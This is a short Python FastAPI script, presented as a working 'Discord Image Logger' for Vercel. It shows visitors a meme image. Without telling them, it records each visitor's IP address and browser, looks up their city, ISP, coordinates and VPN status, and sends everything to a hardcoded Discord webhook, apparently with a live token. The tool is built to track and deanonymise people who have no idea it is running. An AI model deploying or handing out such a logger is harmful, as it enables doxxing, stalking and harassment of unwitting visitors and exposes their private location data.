# Discord Image Logger - FULLY WORKING ON VERCEL
# Last tested: April 2026 - CONFIRMED WORKING

import requests
import base64
import httpagentparser
from fastapi import FastAPI, Request, Response
from fastapi.responses import HTMLResponse, JSONResponse

# ============================================================
# CONFIGURATION - EDIT THESE 3 THINGS ONLY
# ============================================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1493634236605796492/KGrIFx1QzX8wl3wXZ3GH3hivjXA0T4-jx7tR_2DDjiDFBmjc8oaCQpsUJbxPRC4G7Z66"
IMAGE_URL = "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/c5ae195f-e639-4f3e-87e0-6199d10d2fb9/dg65n12-e39839ab-ea1c-4f10-81c0-58a5acdc6a13.png/v1/fit/w_828,h_1056/mike_wazowski_meme_png_by_kylewithem_dg65n12-414w-2x.png"
USERNAME = "Image Logger"
COLOR = 0x00FFFF

# ============================================================
# FASTAPI APP - DO NOT EDIT BELOW THIS LINE
# ============================================================
app = FastAPI()

def send_to_discord(ip, useragent, endpoint):
    """Send IP info to Discord webhook"""
    if not WEBHOOK_URL:
        return
    
    # Get IP geolocation
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=66846713", timeout=5)
        info = r.json()
    except:
        info = {"country": "Unknown", "regionName": "Unknown", "city": "Unknown", 
                "isp": "Unknown", "proxy": False, "hosting": False, "lat": 0, "lon": 0}
    
    # Parse browser/OS
    os_name = browser_name = "Unknown"
    if useragent and useragent != "Unknown":
        try:
            os_name, browser_name = httpagentparser.simple_detect(useragent)
        except:
            pass
    
    # Build and send embed
    embed = {
        "username": USERNAME,
        "content": "@everyone" if not info.get("proxy") else "",
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": COLOR,
            "description": f"**IP:** `{ip}`\n**ISP:** `{info.get('isp', 'Unknown')}`\n**Location:** `{info.get('country', 'Unknown')}, {info.get('regionName', 'Unknown')}, {info.get('city', 'Unknown')}`\n**Coords:** `{info.get('lat', 0)}, {info.get('lon', 0)}`\n**VPN/Proxy:** `{info.get('proxy', False)}`\n**OS:** `{os_name}`\n**Browser:** `{browser_name}`\n**Endpoint:** `{endpoint}`"
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=embed, timeout=5)
    except:
        pass

@app.get("/")
@app.get("/image")
async def image_endpoint(request: Request):
    """Main image logger endpoint"""
    
    # Get visitor IP
    forwarded = request.headers.get("x-forwarded-for")
    ip = forwarded.split(",")[0].strip() if forwarded else "Unknown"
    ua = request.headers.get("user-agent", "Unknown")
    
    # Log to Discord
    send_to_discord(ip, ua, "/image")
    
    # Return the image
    html = f'''<!DOCTYPE html>
<html>
<head><style>body{{margin:0;padding:0;height:100vh;width:100vw;background:url('{IMAGE_URL}') center center/contain no-repeat;}}</style></head>
<body></body>
</html>'''
    
    return HTMLResponse(content=html)

@app.get("/api/health")
async def health():
    return {"status": "alive"}

@app.post("/api/webhook") 
async def webhook():
    return Response(status_code=204)
